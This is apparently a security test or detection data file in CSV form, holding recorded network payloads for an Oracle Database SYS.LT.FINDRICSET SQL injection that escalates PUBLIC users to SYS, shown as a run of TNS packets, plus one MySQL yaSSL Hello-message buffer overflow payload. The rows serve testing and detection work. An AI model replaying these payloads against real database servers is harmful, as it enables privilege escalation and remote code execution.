XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,"[[04 A7 00 00 06 00 00 00 00 00 08 19 00 13 00 00 00 13 ]]AUTH_VERSION_STRING[[0C 00 00 00 0C ]]- Production[[00 00 00 00 10 00 00 00 10 ]]AUTH_VERSION_SQL[[02 00 00 00 02 ]]20[[00 00 00 00 13 00 00 00 13 ]]AUTH_XACTION_TRAITS[[01 00 00 00 01 ]]3[[00 00 00 00 0F 00 00 00 0F ]]AUTH_VERSION_NO[[09 00 00 00 09 ]]169869568[[00 00 00 00 13 00 00 00 13 ]]AUTH_VERSION_STATUS[[01 00 00 00 01 ]]0[[00 00 00 00 15 00 00 00 15 ]]AUTH_CAPABILITY_TABLE[[00 00 00 00 00 00 00 00 0F 00 00 00 0F ]]AUTH_SESSION_ID[[03 00 00 00 03 ]]152[[00 00 00 00 0F 00 00 00 0F ]]AUTH_SERIAL_NUM[[03 00 00 00 03 ]]634[[00 00 00 00 10 00 00 00 10 ]]AUTH_INSTANCE_NO[[01 00 00 00 01 ]]1[[00 00 00 00 10 00 00 00 10 ]]AUTH_FAILOVER_ID[[01 00 00 00 01 ]]1[[00 00 00 00 0F 00 00 00 0F ]]AUTH_NLS_LXLAN[[00 08 00 00 00 08 ]]AMERICAN[[00 00 00 00 16 00 00 00 16 ]]AUTH_NLS_LXCTERRITORY[[00 07 00 00 00 07 ]]AMERICA[[00 00 00 00 15 00 00 00 15 ]]AUTH_NLS_LXCCURRENCY[[00 01 00 00 00 01 ]]$[[00 00 00 00 14 00 00 00 14 ]]AUTH_NLS_LXCISOCURR[[00 07 00 00 00 07 ]]AMERICA[[00 00 00 00 15 00 00 00 15 ]]AUTH_NLS_LXCNUMERICS[[00 02 00 00 00 02 ]].,[[00 00 00 00 13 00 00 00 13 ]]AUTH_NLS_LXCDATEFM[[00 09 00 00 00 09 ]]DD-MON-RR[[00 00 00 00 15 00 00 00 15 ]]AUTH_NLS_LXCDATELANG[[00 08 00 00 00 08 ]]AMERICAN[[00 00 00 00 11 00 00 00 11 ]]AUTH_NLS_LXCSORT[[00 06 00 00 00 06 ]]BINARY[[00 00 00 00 15 00 00 00 15 ]]AUTH_NLS_LXCCALENDAR[[00 09 00 00 00 09 ]]GREGORIAN[[00 00 00 00 15 00 00 00 15 ]]AUTH_NLS_LXCUNIONCUR[[00 01 00 00 00 01 ]]$[[00 00 00 00 13 00 00 00 13 ]]AUTH_NLS_LXCTIMEFM[[00 0E 00 00 00 0E ]]HH.MI.SSXFF AM[[00 00 00 00 13 00 00 00 13 ]]AUTH_NLS_LXCSTMPFM[[00 18 00 00 00 18 ]]DD-MON-RR HH.MI.SSXFF AM[[00 00 00 00 13 00 00 00 13 ]]AUTH_NLS_LXCTTZNFM[[00 12 00 00 00 12 ]]HH.MI.SSXFF AM TZR[[00 00 00 00 13 00 00 00 13 ]]AUTH_NLS_LXCSTZNFM[[00 1C 00 00 00 1C ]]DD-MON-RR HH.MI.SSXFF AM TZR[[00 00 00 00 11 00 00 00 11 ]]AUTH_SVR_RESPONSE`[[00 00 00 ]]`9AF0BB304C8DC6F5EBD809C5840E243CA266CD4CC2BBE1F8D102B2E6FFD92508C1E379A4EC0C2CB15037FFD5179BD970[[00 00 00 00 04 01 00 00 00 03 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 03 00 00 00 00 00 00 ]]6[[01 00 00 00 00 00 00 88 ]]:=[[0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]"
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,"[[00 93 00 00 06 00 00 00 00 00 08 ]]z[[00 ]]zOracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Production[[0A ]]With the Partitioning, OLAP and Data Mining options[[00 01 ]] [[0A 09 01 00 00 00 03 00]]"
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[01 ]]/[[00 00 06 00 00 00 00 00 10 17 ]]`[[BB ]]D[[0C BA 08 ]]nn_[[96 ]]o[[D3 D2 ]]9q[[0D ]]xk[[0A 1F 0D 16 13 1E 00 00 00 01 00 00 00 ]]9[[01 01 80 00 00 1E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 B2 00 01 00 1E 00 00 00 01 04 04 00 00 00 04 ]]USER[[00 00 00 00 00 00 00 00 00 00 07 00 00 00 07 ]]xk[[0A 1F 0D 19 ]] [[01 00 00 00 E8 1F 00 00 06 01 02 07 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 ]]$[[00 00 00 00 00 00 00 00 00 07 04 ]]TEST[[08 06 00 97 DF 13 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 0B 00 00 00 0B 80 00 00 00 ]]4<<[[80 00 00 00 A3 00 04 01 00 00 00 04 00 01 01 00 00 00 00 00 00 00 00 00 01 00 00 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 00 00 01 00 00 00 ]]6[[01 00 00 00 00 00 00 88 ]]:=[[0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 84 00 00 06 00 00 00 00 00 04 01 00 00 00 05 00 01 01 00 00 00 ]]{[[05 00 00 00 00 01 00 00 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 07 00 00 01 00 00 00 ]]6[[01 00 00 00 00 00 00 88 ]]:=[[0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 ]]ORA-01403: no data found[[0A]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 F5 00 00 06 00 00 00 00 00 10 17 99 ]]{[[E7 E7 ED ]]=[[AA E3 A5 B1 ]]UU[[E3 D5 B7 ]]jxk[[0A 1F 0D 16 13 00 00 00 00 01 00 00 00 ]]9[[01 01 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 01 00 00 00 00 00 01 04 04 00 00 00 04 ]]NULL[[00 00 00 00 00 00 00 00 00 00 07 00 00 00 07 ]]xk[[0A 1F 0D 19 ]] [[01 00 00 00 E8 1F 00 00 08 06 00 98 DF 13 00 00 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 02 00 00 00 07 00 01 00 00 00 00 00 00 00 00 00 00 01 00 00 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 09 00 00 01 00 00 00 ]]6[[01 00 00 00 00 00 00 88 ]]:=[[0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 89 00 00 06 00 00 00 00 00 08 06 00 98 DF 13 00 00 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 02 00 00 00 09 00 01 01 00 00 00 00 00 00 00 00 00 01 00 00 00 ]]/[[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0B 00 00 01 00 00 00 ]]6[[01 00 00 00 00 00 00 88 ]]:=[[0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,"[[02 02 00 00 06 00 00 00 00 00 10 17 ]]E`[[09 9F 8B AF A8 04 ]]u[[17 ]]~[[1D ]]""dr[[0A ]]xk[[0A 1F 0D 16 13 ED 02 00 00 05 00 00 00 ]]9[[01 01 80 00 00 F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 B2 00 01 00 F0 00 00 00 01 09 09 00 00 00 09 ]]ATTRIBUTE[[00 00 00 00 00 00 00 00 00 00 01 01 80 00 00 F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 B2 00 01 00 F0 00 00 00 01 05 05 00 00 00 05 ]]SCOPE[[00 00 00 00 00 00 00 00 01 00 01 02 00 0F 02 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 0D 0D 00 00 00 0D ]]NUMERIC_VALUE[[00 00 00 00 00 00 00 00 02 00 01 01 80 00 00 F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 B2 00 01 00 F0 00 00 00 01 0A 0A 00 00 00 0A ]]CHAR_VALUE[[00 00 00 00 00 00 00 00 03 00 01 0C 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 0A 0A 00 00 00 0A ]]DATE_VALUE[[00 00 00 00 00 00 00 00 04 00 07 00 00 00 07 ]]xk[[0A 1F 0D 19 ]] [[01 00 00 00 E8 1F 00 00 08 06 00 98 DF 13 00 00 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 02 00 00 00 0B 00 01 00 00 00 00 ]]{[[05 00 00 00 00 01 00 00 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0D 00 00 01 00 00 00 ]]6[[01 00 00 00 00 00 00 88 ]]:=[[0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 ]]ORA-01403: no data found[[0A]]"
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[01 15 00 00 06 00 00 00 00 00 10 17 8B 03 86 FD F8 91 9F ]]~[[8C 83 ]]U[[C2 87 ]]M[[16 ]]?xk[[0A 1F 0D 16 13 F0 00 00 00 01 00 00 00 ]]9[[01 01 80 00 00 F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 B2 00 01 00 F0 00 00 00 01 0A 0A 00 00 00 0A ]]CHAR_VALUE[[00 00 00 00 00 00 00 00 00 00 07 00 00 00 07 ]]xk[[0A 1F 0D 19 ]] [[01 00 00 00 E8 1F 00 00 08 06 00 98 DF 13 00 00 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 02 00 00 00 0D 00 01 00 00 00 00 ]]{[[05 00 00 00 00 01 00 00 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0F 00 00 01 00 00 00 ]]6[[01 00 00 00 00 00 00 88 ]]:=[[0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 ]]ORA-01403: no data found[[0A]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 A8 00 00 06 00 00 00 00 00 0B 01 05 01 01 00 00 00 01 00 00 00 00 00 CC FA ]]?[[14 00 00 ]]$[[00 00 00 00 00 00 00 00 00 ]] [[08 06 00 98 DF 13 00 00 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 02 00 00 00 0F 00 01 01 00 00 00 00 00 00 00 00 00 01 00 00 00 ]]/[[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 11 00 00 01 00 00 00 ]]6[[01 00 00 00 00 00 00 88 ]]:=[[0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,"[[01 ]]C[[00 00 06 00 00 00 00 00 10 17 90 AF ]]2$5?Y[[D0 AD 8D ]]H[[DF E4 ]]4p[[EA ]]xk[[0A 1F 0D 16 13 01 00 00 00 01 00 00 00 ]]9[[01 01 80 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 B2 00 01 00 01 00 00 00 01 17 17 00 00 00 17 ]]DECODE('A','A','1','2')[[00 00 00 00 00 00 00 00 00 00 07 00 00 00 07 ]]xk[[0A 1F 0D 19 ]] [[01 00 00 00 E8 1F 00 00 06 01 02 07 01 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 ]]$[[00 00 00 00 00 00 00 00 00 07 01 ]]1[[08 06 00 98 DF 13 00 00 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 02 00 00 00 11 00 01 01 00 00 00 ]]{[[05 00 00 00 00 01 00 00 00 03 00 ]] [[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 13 00 00 01 00 00 00 ]]6[[01 00 00 00 00 00 00 88 ]]:=[[0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 ]]ORA-01403: no data found[[0A]]"
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 16 00 00 06 00 00 00 00 00 08 02 00 00 00 09 05 00 00 00 13 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 16 00 00 06 00 00 00 00 00 08 02 00 00 00 09 05 00 00 00 14 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 89 00 00 06 00 00 00 00 00 08 06 00 9D DF 13 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 01 00 00 00 15 00 01 00 00 00 00 00 00 00 00 00 00 01 00 00 00 ]][[[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 17 00 00 01 00 00 00 ]]6[[01 00 00 00 00 00 00 88 ]]:=[[0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 0B 00 00 0C 00 00 00 01 00 01]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 0B 00 00 0C 00 00 00 01 00 02]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,"[[00 E6 00 00 06 00 00 00 00 00 04 05 00 00 00 17 00 01 00 00 00 00 87 03 00 00 00 00 02 00 00 00 ]]/[[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 00 00 00 00 00 00 ]]6[[01 00 00 00 00 00 00 88 ]]:=[[0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]{ORA-00903: invalid table name[[0A ]]ORA-06512: at ""SYS.LTRIC"", line 7732[[0A ]]ORA-06512: at ""SYS.LT"", line 13377[[0A ]]ORA-06512: at line 1[[0A]]"
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 11 00 00 06 00 00 00 00 00 09 01 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 00 00 00 00 00]]
﻿FSC20080104-15_MySQL_yaSSL_SSL_Hello_Message_Buffer_Overflow.xml,MySQL yaSSL SSL Hello Message Buffer Overflow,There exists a buffer overflow vulnerability in MySQL. The flaw is due to boundary error when handling crafted client Hello message when using yaSSL for secure connection. A remote unauthenticated attacker may exploit the vulnerability to inject and execute arbitrary code on the target with privileges of MySQL service.,MYSQLSSL,TCP,[[16 03 01 00 ]]{[[01 00 00 ]]w[[03 01 ]]G[[CD A7 ]]!K[[E3 ]]U[[B3 89 ]];[[00 BE ]]SH[[E9 ]]A[[AC 0E 02 D9 93 CE DA F2 A2 A3 ]]kMB`[[AA EC 02 ]]bb[[00 ]]Paaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[[01 00]]
